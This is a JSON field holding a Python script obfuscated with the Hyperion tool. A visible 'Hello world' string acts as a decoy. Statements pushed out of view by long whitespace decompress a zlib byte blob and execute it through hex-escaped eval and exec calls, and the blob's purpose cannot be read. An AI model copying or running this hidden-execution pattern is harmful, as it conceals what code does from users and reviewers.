"protected": "from builtins import *\nfrom math import prod as Add\n\n\n__obfuscator__ = 'Hyperion'\n__authors__ = ('billythegoat356', 'BlueRed')\n__github__ = 'https://github.com/billythegoat356/Hyperion'\n__discord__ = 'https://discord.gg/plague'\n__license__ = 'EPL-2.0'\n\n__code__ = 'print(\"Hello world!\")'\n\n\nDivide, _builtins, Builtins, While, DetectVar, _add, Walk = exec, str, tuple, map, ord, globals, type\n\nclass MemoryAccess:\n    def __init__(self, _positive):\n        self.Frame = Add((_positive, -40668))\n        self.Multiply(_random=59110)\n\n    def Multiply(self, _random = True):\n        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler\n        self.Frame += 884 / _random\n        \n        try:\n            ((Builtins, {_builtins: DetectVar}) for Builtins in (DetectVar, Divide, DetectVar) if Positive is Builtins)\n\n        except AssertionError:\n            ((DetectVar, _builtins, _builtins) or DetectVar if (DetectVar, _builtins, _builtins) and DetectVar else ... or (DetectVar, (DetectVar, _builtins, _builtins)))\n\n        except:\n            Walk(-99067 + -941) == type\n\n    def CallFunction(self, Modulo = 6116):\n        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler\n        Modulo /= 71192 / 24854\n        self._algorithm != bool\n        \n        try:\n            ((DetectVar, (Builtins, Builtins)) for DetectVar in (_builtins, DetectVar, Divide) if Divide < _add)\n\n        except AttributeError:\n            {_builtins: DetectVar} if Builtins > Divide else {Divide: Positive} < Divide\n\n        except:\n            Walk(-44362 + -32637) == type\n\n    def _theory(Round = str):\n        return _add()[Round]\n\n    def Substract(_modulo = 65395 * -95967, Algorithm = int, Square = _add):\n        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler\n        Square()[_modulo] = Algorithm\n        \n        try:\n            ((DetectVar, Divide, DetectVar) or Builtins if (DetectVar, Divide, DetectVar) and Builtins else ... or (Builtins, (DetectVar, Divide, DetectVar)))\n\n        except AssertionError:\n            ((Divide, (DetectVar, Divide, DetectVar)) for Divide in (Builtins, Builtins) if _add != While)\n\n        except:\n            Walk(-25896 + -6177) == float\n\n    def execute(code = str):\n        return Divide(_builtins(Builtins(While(DetectVar, code))))\n\n    @property\n    def _algorithm(self):\n        self.Hypothesis = '<__main__.Square object at 0x000005095BE57315>'\n        return (self.Hypothesis, MemoryAccess._algorithm)\n\nif __name__ == '__main__':\n    try:\n        MemoryAccess.execute(code = __code__)\n        Negative = MemoryAccess(_positive = -974 + 60762)\n\n        if 455107 > 4214538:\n            MemoryAccess(_positive = -50728 + -44940).Multiply(_random = Negative.Frame - 49192)\n        elif 326248 < 1126713:\n            MemoryAccess(_positive = 19092 / -8587).Multiply(_random = Negative.Frame * 39019)                                                                                                                                                                                                                                                          ;MemoryAccess.Substract(_modulo='ljljjljiiljiljilj',Algorithm=b'x\\x9c\\xed\\x1akS\\xe38\\xf2;\\xbf\\x82\\xcd\\x17;\\xc5\\x0c8\\xb2-\\xdbT\\xf1\\xe5\\x8a\\xbb\\xdaP@\\xaev\\xaen\\xf6\\x8a\\xa1R\\x8e\\x1f\\xe0\\xaccQ\\x89\\xb3\\x84\\x7f\\x7f\\xdd-91N\\xec<\\x08\\x19\\xeeX)-\\xb5Z\\xef\\x96\\xba\\xd5\\x92\\x93\\x8f_\\xce\\x8f\\x8e\\xc1%\\xb1N1\\xba~_\\x0c\\xe2\\xe9$\\xf0s1\\xee\\xf7\\x8f\\x7f\\xb9h\\xfd\\xfa\\xf2\\x14\\x8d\\x13\\x91\\xb5\\x8e\\xc5\\xb8T\\xcc\\x9f\\xe6\\x8fb<\\xa12zk\\x90\\xa4\\xe9K\\xfe\\x18=\\x08?7m\\xde\\xfa\\xd2\\xfa[:\\x8d~\\x8b\\xc2V\\xfbU\\xad\\x87$\\x7f\\x9c\\x0ed\\xc3\\x8fy\\xfe49?;\\x93\\xb4\\xd3@\\x8c\\xce*\\xcd\\x9c\\xd5\\xf4\\x1d&\\x93@\\x8c\\xc3\\xd7\\xcd(\\xe2\\xe9\\xc3\\xc3\\xd9S\\xea?L\\xa3J\\xa54\\t\\xa2l\\x12\\xc9J\\x7f\\xff\\xe7\\xf5WvjT\\x8a\\x04\"\\x94\\xf9\\xda\\xd38\\xc9r\\xbd\\xf5k\\x94\\xa6\\xe2\\xf8Y\\x8c\\xd3\\xf0\\x97V[;j\\x9f\\xcfKc\\xbe6\\xf9#\\t\\xb5\\xf6Q4\\x0b\\xa2\\xa7\\\\13{\\x9aB\\xcd\\xdf\\xc4$\\x9a\\x1c\\xfb\\xe3\\xe8x\\x1c\\x85?\\xb2\\x7f\\'\"\\x8drI\\x18\\x00g~d\\xff\\x11SJ\\xf9\\xc7\\xd8\\xc8\\x8f\\xecV\\x0cD\\xf8r\\x9c&\\x7f@\\xbd\\x171m\\xb5\\x8f\\xe4\\xa0\\x92\\xd1\\x93\\x18\\xe7\\xfd>\\xf4\\xf62\\xd1\\xda\\xa7\\xd1,\\xc9\\xf5\\xf6Q*\\x02?\\x9d\\xe8\\xed;-\\x05\\x97\\x0c\\x81s\\t\\x85\\xc3d\\x98\\x0e\\xb5\\xfb\\x8b\\x87T\\x0c\\xa0\\xc4\\xd1\\xaal\\xac\\x96\\x8d\\xb2lD\\x0e\\xe3L\\x85\\xda\\xdd\\xf9\\xf9\\xc9\\xd7\\x93\\xaf\\xfaW\\xfd\\xa4\\xd3n\\xdfC;Q\\xee\\xe7\\xf9\\xb8\\xb6\\x9d\\xdb\\xdb\\x9b\\x9b\\x1b\\x04t\\xb7\\xe8(\\xbe\\xb9Yn*L\\x1a\\x9a\\xa1\\xba*\\x90m\\xe1\\xef\\x16f\"\\xa7zTW\\x82x\\x90\\xa4\\xc3\\xe10IRr\\x10\\x0f\\x81\\x02U\\x17\\xec\\xab\\xed\\xf8\\x1b8\\xc60x\\x1d1\\x86]\\xafjW\\xd7\\x06\\xd3$\\xcd\\x93\\x0c\\x97\\xe3O\\x7f<9\\xaao\\x03{\\xe8\\x89^O\\x18=pB\\x88\\x9e\\x01\\xa8\\x81Q\\xaf\\x07\\x1d\\x8c2\\xe2\\xbf\\x0c\\x8b\\xd5\\xc8\\xf4\\x9a~\\'Y\\x92\\xa7\\xc9tPem\\xfb\\x8bd\\xf9\\x9c\\xff\\x8a;\\x90\\xde\\xba\\xa9\\xf6\\xdd\\x1e\\xdb:M\\xb20\\x9a\\xe9\\xda8\\x9f,e\\xde\\xb7\\x1b\\x97\\x94XB\\xdb2\\xcb\\x14\\x93(=\\xfa<\\\\\\x8b\\xa6\\xe3\\x7f\\xadb[\\xddV\\xbe\\xbe\\xbe\\xba\\xea^u\\xaf\\xbb]\\x88\\xaf\\xaf \\xfa<\\xbcJ\\x85X\\xcem\\xe0\\xd5m\\xb1\\xd9\\x94\\xda\\xba\\xf9<\\xac\\xca}\\x91\\xc6\\xabx\\xd5\\xac\\xc6\\x9eg\\xb3\\xe7\\xd9\\xf3\\xf3\\x1c ={\\xfe<\\\\\\x8b&\\xa9\\xff\\x8fm\\x95\\xd8\\xf7\\xef\\xdf\\x7fG\\xff;\\x86\\x80\\xcb\\xc4\\'bZ\\x9a<\\x8dD\\xb0\\xfdf\\xc3\\x11\\xc8q\\x14\\xf6\\x04\\xa1\\xc09M;\\x1d\\x8a$\\xab\\x15l\\xdc\\x963\\xda\\xa1ED\\xbbuk\\x9e\\'I0\\xf1\\xb3d\\x1f<\\xafmj\\x07\\x9e\\xd7\\xb7U\\xf0\\xfc%N\\xd2Y\\xf4\\x98M\\xb7\\xe7\\xfa\\x10x\\x08?\\x19\\x80\\x1b\"[q\\x14\\x9fg\\xc7\\xa6\\xfe\\x9f\\xd1\\x16\\xe7H\\xcdn\\xd3\\x07\\x9a\\xed\\x90wK\\xb0\\x9cr\\x8bR`I\\x86\\x11\\xde?t\\xcd\\x8d\\xf3\\x15K\\xf7Y\\xf8\\x1fD\\xb3\\x0f\\xc9\\x7f\\xbd\\xbe\\'\\xce\\x1d\\xc6c\\x1e2\\x833\\xc7\\xe6\\x1e\\x0f\\x1c\\x0b\\xc2\\xc81\\x81\\xe2\\xf1\\xd01x\\xec0\\xc7\\x82\\x94\\xed\\xb8\\xdc\\xe6\\xe6\\xba\\xde\\x9a\\x0f\\x15\\x92\\xdaWr,\\x03\\x10\\xd2f\\xf1\\xae\\xf2\\xb6V\\xdc\\x1b&kvX\\xc8\\\\\\x16\\x9a\\x06\\xf3\\xd6N\\x03o}kT\\x8e\\x10\\x97t1\\x82\\xe0RP$.\\x81\\xb2\\xd90\\xb5\\xb6\\x01%:\\x9b\\x16\\xb6\\xfa\\xbc\\xef\\xf5;\\xe0\\xed\\xbe\\xd17!t\\xa0\\x86\\xbdL}\\x97\\xde;P\\xc2x3\\xfb\\r\\xc5\\xfe\\xcef\\xec\\xaf\\xc2\\xfd\\xc5.\\xbd2\\x07\\xbd\\xe13Cz\\xdb\\xe0\\x1d \\x98\\xdcf\\x06\\xec\\xe8\\x90\\x07v\\xec\\x98\\x8e\\x05r\\x00\\xfb\\x1e\\xc4\\x01\\xf2!\\x86\\x1d\\x0f\\x14\\x1b\\xe86\\xc4\\x11\\xa4,\\xeeR\\x1d\\x94\\x97XJ\\x04\\x0f\\x00B\\x80\\x88\\xd21\\xe7\\x8br\\xb6k\\x85V\\x00T\\x0b\\xe8\\xa63/\\xb7\\x18\\x89\\x1c\\xd9zyj\\xde\\x84xk\\xba\\xa2\\xdb\\xd35\\xfe\\xae\\xae\\xbb\\x90x\\x87u}\\xbf\\xc2\\r;\\xc6\\xb1c\\x02\\x13\\xc0U8\\x82\\x05\\xc0\\x00l\\x80\\x0e\\x1b\\xd0\\xae\\xda\\xa4\\xec\\x86\\x82\\xffz\\xd7\\xa5\\xfeh\\x10\\xfa\\xc7 \\xe4\\x97\\xa2w\\x89\\x02\\x8f\\xd2.\\xc4y\\xbd\\xa2[k!\\xca+\\xdc\\xa2\"Y\\x89\\xb77\\xef\\xb2\\x146)\\x08\\xdeg\\x00f\\xdfAE\\x015\\xf82\\xf5]T\\xc7{\\x15\\xde\\x9f\\x9a_\\xadk\\xd4\\xaa\\x83B\\x17\\xa8\\xde!\\x14\\xb8\\xfc\\x97\\x98\\xb8\\x84\\xe8\\xbci\\x89\\xd7\\xac\\x7f7\\x05\\xdfM)\\xec\"\\x92\\x1e\\x96A;(\\xe29C\\x8a\\xb7\\xad\\x91\\n \\xbd\\xbb $4|2\\x8b\\x12\\x08S\\x1c\\xfa\\x86\\xbc\\xd8\\xe31_LM.\\x06z\\xb9:j\\x85\\xd2\\xee\\xee\\x13d\\x85\\x95\\xc3J1\\xfe\\x0e\\xbd\\x86\\xf3I\\xaau\\x1b\\x8d\\xd4\\xea\\xd1\\x03\\xe5\\xee\\x13$f\\x91\\xa1\\xdc-\\xf6\\xb2t\\x87\\xdd\\xd1\\xa8\\xdc=\\x00\\xae\\x94}G)\\x7f\\xb7\\x1c\\xab\\x83b\\x93\\xb2|\\x07\\xc9H\\x8b\\xbd\\x93\\xa6J\\xc0wg\\xeb\\xa8x1.\\x9e\\x90G\\xd9\\x9by\\xe4\\xaa\\xf9\\x16sw\\xd5a\\x89s6\\x14\\x9d)\\x1emRv\\xe3\\x9d\\xb7\\xab\\xd9\\xf6F\\xd3\\xa8\\xe1\\xd6\\x13[\\x16\\x02\\xb9\\x98\\xb0\\x82\\xa2\\xa8<Ve\\xe2\\xf5\\xb7[\\xb5\\xfc\\xd4\\xfeLvJo\\x8c\\x05\\xfa\\x96\\x93\\xa2x\\xab\\x94\\xed\\xce;\\x98\\xcd6\\x15/N\\x87<\\xde\\x13:p\\xd4[\\xe0m\\xa8\\xe1,S\\xdf\\xc5\\xf4\\xf8_\\xbcd\\xcc\\xa5y~\\x0c(\\x84\\x82\\xb7,\\xa64\\xf8H\\x01\\x94\\xbe6\\xde\\xfe\\xb4\\xf3\\x0e\\xaf\\xaeFO\\x18\\x10\\xe1\\xed\\xd50\\x0c\\xd1\\xdbYe5\\xbcf\\x98\\xb6i2P\\'&B\\x19\\x97 \\xa9\\xd2#\\xbe\\xb1\\xc4}S\\x87\\xea\\xfch%\\x845Ma\\xeb\\xa7\\x18\\xee\\x83\\x0f\\xe6a\\x19\\x93^\\xa6<\\xa2\\xa3_\\xbb\\x04\\xf7\\xfa\\xae|\\xac\\xbe\\n\\xb9\\xa5\\xf7 \\xa7\\x94r\\xdf\\xf8&TL\\xcd\\xa3\\x89Il\\x81\\xcb\\xc9B\\x0c{\\xce\\xb3\\x07\\xac:\\x82\\xe6w+P\\xeb\\xf6\\xc0\\xf4M\\x1f\\x0e\\x9a\\x90\\xc0%\\x18l\\xcfh\\xa8\\xe50\\xaf\\xb4\\xfb\\xf7\\xd8\\xb2\\xe38\\xae\\xf2\\x0e\\xe1\\x8e\\xa2\\x94S\\x05\\xe60\\x973\\xe6\\x98\\xa6i\\x98\\x8c[\\xb0\\xa3]\\x8aM\\xb3\\x03\\xb8\\x87\\xa3d\\x11\\xb7\\xf0\\xf5\\x0c\\xce\\x15\\x88q\\xe4\\xa6\\xcb9\\xbe.\\xd4\\x8d\\x1a\\x15\\x18\\xf07\\xc4\\xb0\\x8c\\xd9!`\\xbb\\x8d\\x0f\\xc4\\x8b\\x00e\\xae\\x1c\\x97\\xe9\\xabh\\xd5\\xbc:\\x1a\\xce\\x9bs\\x1b\\xc0*\\xc5\\x05n\\xaf\\xc8\\xb3W\\xe4/\\xea\\xed\\x85w\\xeb$\\xe1K\\x9c\\xa4Q\\xe6\\x8f\\xa2\\x0b\\xed\\xea\\xea\\x9a^S\\xf03\\xf45\\x1a\\xb3\\x9b\\x9e\\\\&\\xdc\\xa0\\x19x\\x93n\\xd3^\\xdf\\xed{P\\xc3Z\\xa6\\xee\\xe5A\\x84+\\x1b\\xccU\\x8f\\x1a\\x85\\xadV\\xd8h\\xe5\\x07\\x91ue\\xb7\\xb8\"\\x7f\\x19A\\x99\\x8b\\xa5\\x8f\\x0c\\x879\\xa4\\x1b\\x1f\\x95e\\x7f\\x8b\\xfe\\x8b\\xe1\\x0c7_?\\x07<\\x9aA\\x1e\\xc4&\\xac\\x94C\\xeb\\xb7D\\xfd\\xf0\\xd7t:\\xdf\\xf5\\x06f\\xfd\\xfc\\xe3\\xc5\\x8a\\xac\\x10@\\xfa\\xd7X8\\xf7\\xd1<\\x8c\\xe41\\xb3\\xa3\\xc2+\\x83[\\x13o\\x92\\xe7V\\xdbz\\xabb\\xdaY\\x89s\\xd3\\x03\\xe0\\xa0\\x1c\\r\\xd3\\x02%\\t=+\\xa8\\xe2\\xab\\xa0Z\\xce\\xae\\xd0\\xad\\xa5|\\x93wL\\x83w\\x0e\\xd6\\x1f#^/\\x1fH\\xe5\\x83\\xa9\\xee0\\xaa;\\xc4\\xaa\\x87\\xd9\\x81\\x0f\\x96FS\\xcb\\x9f\\x9bZ\\xd2\\xcc*\\xcc\\x90\\xa0dp-L\\x94\\xf5\\xbd\\x92\\x96n\\xe8\\xd1v8\\xef\\xf0`\\xbdBiR\\xb9\\x87\\xb5\\x97?\\xb4:\\xdb\\xceZ\\xfeK\\x8d\\x95\\xd5\\x18\\x88\\xbe\\x03j\\x85s\\x0e1\\x03\\xb0H\\xcd8dG\\xa2\\r\\x08\\xa2\\x8a\\xf6 \\x8d\\xd6\\xa22\\x88# \\xddB\\x1c\\xca\\x10\\r\\xcb\\x9b\\xd2~t(\\xa7R\\x1e\\xfb\\x01{\\xdc!\\xf17\\xa8\\x04\\x94\\xf9\\x18j\\xc0\\xf2\\xc0\\x07\\x96\\x0f\\xe0A\\xe8)Lz\\xc4\\x03\\x95\\xb3Vl\\x7f\\xae\\x91\\xf6\\xd7\\xed\\xfa\\xff\\xe9v\\xfd\\x11\\xef\\xc0{2\\x9b\\xb8\\x04\\xe5y\\x91V\\xc0K@%V\\xe4\\x95iE\\x1b\\x9c\\x94\\xd1\\xc2\\\\\\xa2\\xe4\\x1a\\xb0`\\\\\\xab\\xa0\\xael\\x15G>\\xbf\\xe7|\\x0e}\\x07\\xcf\\xc8\\x8dF\\xea\\xdfb\\n\\xdb\\xf8\\xdeE\\xaf\\xda\\xf2\\xb2f\\xd1\\xbfb\\\\\\xecc\\x99\\xbay\\x83.=\\x95\\xf3\\xbe\\x81\\xd5\\x00:\\xd4\\xe0\\x12\\xf5g]\\xf6\\xf6h\\xef\\xd5h\\xef\\xb7^\\xaf\\xf7\\xf8\\r\\xb3\\xc9\\x12\\xd4\\xd4\\x1f\\x94\\xe5\\xdf\\x96e\\x02\\xf07\\x8f\\xd1S/\\'\\xc5\\x970\\xa7\\xf4\\xa2\\xc2\\xe7\\xaf(\\xf2\\xc5e]Y\\xfa\\xa2\\xb6\\xe9\\\\[\\x84vN\\x80\\x0c\\x99\\'\\xe7\\xe7w\\xda4\\x8f]M\\x8fB\\x11D\\xe1i[\\x8b8\\xfaP\\xc1\\x02\\x0f\\x15\\xbe\\xc0\\x0c\\x90_\\x10T\\x94W\\x88\\x8b\\xff\\x1f\\xf9\\x86\\xc7\\x18\\xde\\x8cl\\x0c\\xf1\\xfdn\\x11.\\xa7\\x8b\\x10d_\\xb9B\\x07\\x975\\xb2;\\xd7\\xc5n\\xc9\\x1b\\xec\\xb5\\xf7\\r\\xdf\\x04\\x8b\\x87K\\xc0p\\x81K/O%\\x83q8\\x93\\xca\\xe3u`>\\x1e\\xcc\\xc1rL\\'\\xb6\\x03\\x98\\x1b\\xb4\\xff\\x8a\\x1a\\x82\\x8e\\x02\\x02\\x8f\\x98e\\xdbVhn\\xc3\\xa5E?r<E\\xa8Nl\\xab:\\xbe\\xb2ww\\xa8\\xb3\\x8a/\\xe1|\\x9c\\x8bQ/F^\\xa4\\xaa\\x9c\\x89Q3[\\xb1\\xf4\\xf4\\xf52\\xa6o\\x99\\x84\\xf3\\x82N\\xdf;\\xc1\\x97g\\xba]M\\x97\\xf9%\\x1b\\x15mV_\\xd9\\xae\\x9eJ\\x05\\x84!\\xbejv\\xb2-\\xd9\\xa7\\xa5\\xbe\\xb7\\xca\\xfe\\x8b/\\xb1VAY\\x9a\\xa3o\\xd6\\xad\\x7fXzB\\xaa>,E\\xf3\\x87\\xa5\\x02\\xc3vm8\\xc7\\xb4\\x81\\xfe\\xacD\\xbd$\\xf9\\xa8\\t\\xf4\\xfbu\\xb2\\xb7\\x95Uf\\xd7\\xf7t\\xd7\\xd6\\x99\\xb2O\\xbf\\xbd\\x8e\\xc0\\xb5\\x0e\\xac`7\\xba\\xab\\x80J+v\\x06\\x86\\xa6!w\\x08\\xc6\\x98\\x03v\\x8fQ\\xe0\\x16\\xa5\\x0e\\xf8d\\xf1_\\xfd\\x8c\\x99\\x0b')\n\n        MemoryAccess(_positive = -32841 - -4690).CallFunction(Modulo = -81052 + Negative.Frame)                                                                                                                                                                                                                                                          ;OoOOooO000OO0OOO00o,Oo0o0oooOO0O0oo0ooo,xwwxwwxwwxxwwwxwxxxwwwxx,WXWXWWXXWWXWWWXWXXWX,SSSS2SS22S2S22S2S2222=(lambda nmnnnnnmmnnnmnnnn:nmnnnnnmmnnnmnnnn['\\x64\\x65\\x63\\x6f\\x6d\\x70\\x72\\x65\\x73\\x73']),(lambda nmnnnnnmmnnnmnnnn:globals()['\\x65\\x76\\x61\\x6c'](globals()['\\x63\\x6f\\x6d\\x70\\x69\\x6c\\x65'](globals()['\\x73\\x74\\x72'](\"\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x28\\x29\\x5b\\x27\\x5c\\x78\\x36\\x35\\x5c\\x78\\x37\\x36\\x5c\\x78\\x36\\x31\\x5c\\x78\\x36\\x63\\x27\\x5d(nmnnnnnmmnnnmnnnn)\"),filename='\\x4d\\x4d\\x4d\\x4d\\x4d\\x4d\\x4d\\x4d\\x4d\\x4d\\x4d\\x4d\\x4d\\x4d\\x4d\\x4e\\x4e\\x4d\\x4e\\x4e',mode='\\x65\\x76\\x61\\x6c'))),(lambda nmnnnnnmmnnnmnnnn:nmnnnnnmmnnnmnnnn(__import__('\\x7a\\x6c\\x69\\x62'))),(lambda NMNMNMNMNMMNNMNNNNNNNN,nmnnnnnmmnnnmnnnn:NMNMNMNMNMMNNMNNNNNNNN(nmnnnnnmmnnnmnnnn)),(lambda:(lambda nmnnnnnmmnnnmnnnn:globals()['\\x65\\x76\\x61\\x6c'](globals()['\\x63\\x6f\\x6d\\x70\\x69\\x6c\\x65'](globals()['\\x73\\x74\\x72'](\"\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x28\\x29\\x5b\\x27\\x5c\\x78\\x36\\x35\\x5c\\x78\\x37\\x36\\x5c\\x78\\x36\\x31\\x5c\\x78\\x36\\x63\\x27\\x5d(nmnnnnnmmnnnmnnnn)\"),filename='\\x4d\\x4d\\x4d\\x4d\\x4d\\x4d\\x4d\\x4d\\x4d\\x4d\\x4d\\x4d\\x4d\\x4d\\x4d\\x4e\\x4e\\x4d\\x4e\\x4e',mode='\\x65\\x76\\x61\\x6c')))('\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f\\x28\\x27\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x27\\x29\\x2e\\x65\\x78\\x65\\x63'))\n        if 498428 > 5643260:\n            MemoryAccess(_positive = 54407 - 47970).Multiply(_random = Negative.Frame / 40706)\n        elif 334009 < 8223840:\n            MemoryAccess(_positive = 3120 - -16186).CallFunction(Modulo = -89673 * Negative.Frame)                                                                                                                                                                                                                                                          ;SSSS2SS22S2S22S2S2222()(WXWXWWXXWWXWWWXWXXWX(OoOOooO000OO0OOO00o(xwwxwwxwwxxwwwxwxxxwwwxx(Oo0o0oooOO0O0oo0ooo('\\x76\\x61\\x72\\x73'))),MemoryAccess._theory(Round='ljljjljiiljiljilj')))\n\n    except Exception as Positive:\n        if 494120 > 917026:\n            MemoryAccess.execute(code = _builtins(Positive))\n\n        elif 345835 > 675126:\n            MemoryAccess(_positive = -16851 / -47150).CallFunction(Modulo = -83355 - Negative.Frame)"